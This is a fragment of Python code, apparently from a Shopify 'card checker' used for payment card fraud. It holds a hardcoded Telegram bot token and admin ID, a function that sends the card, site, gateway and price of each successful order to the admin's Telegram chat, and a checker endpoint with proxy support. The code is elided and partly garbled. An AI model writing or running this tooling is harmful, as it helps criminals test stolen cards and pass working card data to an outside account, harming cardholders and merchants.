...
BOT_TOKEN = '8789924683:AAHJTBGgIM4skMNQj7ywbJnCQ0Wle8tpXic'  # ???? ?????
ADMIN_USER_ID = 5621614605  # ???? ?????? (???)

async def send_telegram_notification(card, site, gateway, price, message):
    """Send notification to Telegram when ORDER_PLACED (to admin's DM)"""
    try:
        from telegram import Bot
        bot = Bot(token=BOT_TOKEN)
        
        notification_text = f"""? <b>ORDER PLACED!</b>
...
?? @im_porto"""
        ...
        await bot.send_message(chat_id=ADMIN_USER_ID, text=notification_text, parse_mode='HTML')
        print(f"[+] Notification sent to admin for {card[:10]}...")
...
async def shopify_checker(
    ...
    proxy: str = Query(None, description="Optional proxy"),
